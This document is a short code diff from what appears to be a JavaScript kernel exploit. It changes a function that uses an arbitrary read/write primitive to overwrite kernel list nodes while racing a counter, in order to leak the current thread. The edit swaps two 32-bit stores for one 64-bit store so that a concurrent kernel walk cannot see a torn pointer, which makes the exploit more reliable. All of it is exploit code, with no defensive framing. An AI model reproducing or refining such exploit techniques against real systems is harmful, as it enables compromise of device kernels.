@@ -870,7 +870,9 @@ async function pr_leak_curthread() {
   for (let m = PR_CUT_MARGIN; m <= PR_CUT_MARGIN << 3; m <<= 1) {
     const at = pr_counter(ctr, 0) + m;
     if (at >= PR_N_LEAK - 1) break;
-    arw.view(chain.addr.add(at * PR_NODE_SZ + 0x30)).setBInt(0, 0, true);
+    // Single 8-byte store. setBInt() emits two 32-bit stores; a concurrent
+    // kernel walk can observe a torn pointer (new low half, old high half).
+    arw.view(chain.addr.add(at * PR_NODE_SZ + 0x30)).setFloat64(0, 0, true);
     if (pr_counter(ctr, 0) < at) {
       cut_at = at;
       break;
